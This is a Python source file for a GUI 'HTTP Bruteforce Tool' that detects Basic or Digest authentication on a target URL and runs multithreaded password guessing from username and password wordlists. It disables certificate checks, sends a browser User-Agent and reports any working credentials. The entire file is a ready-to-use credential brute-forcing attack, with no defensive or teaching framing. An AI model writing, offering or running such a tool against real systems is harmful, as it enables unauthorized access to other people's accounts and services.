import warnings
warnings.filterwarnings("ignore")
import tkinter as tk
from tkinter import ttk,filedialog
import threading,time
from urllib.parse import urlparse
import requests
from requests.auth import HTTPDigestAuth

class Exploit:
 def __init__(self,log_callback):
  self.log=log_callback
  self.stop_flag=False
  self.attempt_count=0
  self.lock=threading.Lock()
  self.session=requests.Session()
  self.session.headers.update({"User-Agent":"Mozilla/5.0","Connection":"keep-alive"})
  self.session.verify=False
 def generate_combos(self):
  for p in self.passwords:
   for u in self.usernames:
    yield(u,p)
 def run(self):
  self.credentials=[]
  if not self.check():return
  self.log("[*] Starting attack...\n")
  self.combo_iter=self.generate_combos()
  threads=[]
  for _ in range(self.thread_count):
   t=threading.Thread(target=self.worker)
   t.daemon=True
   t.start()
   threads.append(t)
  for t in threads:t.join()
  if self.credentials:
   self.log("\n[+] Credentials found:\n")
   for u,p in self.credentials:self.log(f"[+] {u}:{p}\n")
  else:self.log("\n[-] No credentials found\n")
 def worker(self):
  while not self.stop_flag:
   with self.lock:
    try:u,p=next(self.combo_iter)
    except StopIteration:break
   try:
    auth=HTTPDigestAuth(u,p) if self.auth_type=="digest" else (u,p)
    r=self.session.get(self.url,auth=auth,timeout=5)
    self.attempt_count+=1
    if r.status_code!=401:
     print(f"[SUCCESS] {u}:{p}")
     self.log(f"[SUCCESS] {u}:{p}\n")
     self.credentials.append((u,p))
     self.stop_flag=True
     break
    else:print(f"[FAIL] {u}:{p}")
   except Exception as e:print(f"[ERROR] {e}")
   time.sleep(0.05)
 def check(self):
  try:r=self.session.get(self.url,timeout=5)
  except Exception as e:self.log(f"[ERROR] {e}\n");return False
  h=r.headers.get("WWW-Authenticate","")
  if "Digest"in h:self.auth_type="digest";self.log("[*] Detected Digest Auth\n");return True
  if "Basic"in h:self.auth_type="basic";self.log("[*] Detected Basic Auth\n");return True
  self.log("[-] No Basic/Digest auth detected\n");return False

class App:
 def __init__(self,root):
  self.root=root
  self.root.title("HTTP Bruteforce Tool")
  self.root.geometry("600x500")
  self.create_widgets()
 def create_widgets(self):
  ttk.Label(self.root,text="Target URL").pack()
  self.url=ttk.Entry(self.root)
  self.url.insert(0,"http://127.0.0.1")
  self.url.pack(fill="x")
  ttk.Label(self.root,text="Threads (5-15 recommended)").pack()
  self.threads=ttk.Entry(self.root)
  self.threads.insert(0,"10")
  self.threads.pack(fill="x")
  ttk.Label(self.root,text="Username File").pack()
  f=ttk.Frame(self.root);f.pack(fill="x")
  self.user_file=ttk.Entry(f);self.user_file.pack(side="left",fill="x",expand=True)
  ttk.Button(f,text="Browse",command=self.browse_user).pack(side="right")
  ttk.Label(self.root,text="Password File").pack()
  f2=ttk.Frame(self.root);f2.pack(fill="x")
  self.pass_file=ttk.Entry(f2);self.pass_file.pack(side="left",fill="x",expand=True)
  ttk.Button(f2,text="Browse",command=self.browse_pass).pack(side="right")
  ttk.Button(self.root,text="Start Attack",command=self.start_attack).pack(pady=10)
  self.output=tk.Text(self.root,height=20);self.output.pack(fill="both",expand=True)
 def browse_user(self):
  p=filedialog.askopenfilename()
  if p:self.user_file.delete(0,tk.END);self.user_file.insert(0,p)
 def browse_pass(self):
  p=filedialog.askopenfilename()
  if p:self.pass_file.delete(0,tk.END);self.pass_file.insert(0,p)
 def log(self,t):self.output.insert(tk.END,t);self.output.see(tk.END)
 def start_attack(self):
  self.output.delete(1.0,tk.END)
  def run():
   try:
    e=Exploit(self.log)
    p=urlparse(self.url.get())
    e.url=f"{p.scheme}://{p.netloc}/"
    e.thread_count=int(self.threads.get())
    with open(self.user_file.get()) as f:e.usernames=[x.strip() for x in f if x.strip()]
    with open(self.pass_file.get()) as f:e.passwords=[x.strip() for x in f if x.strip()]
    self.log(f"[*] Target: {e.url}\n\n")
    e.run()
   except Exception as x:self.log(f"[ERROR] {x}\n")
  threading.Thread(target=run,daemon=True).start()

if __name__=="__main__":
 root=tk.Tk()
 app=App(root)
 root.mainloop()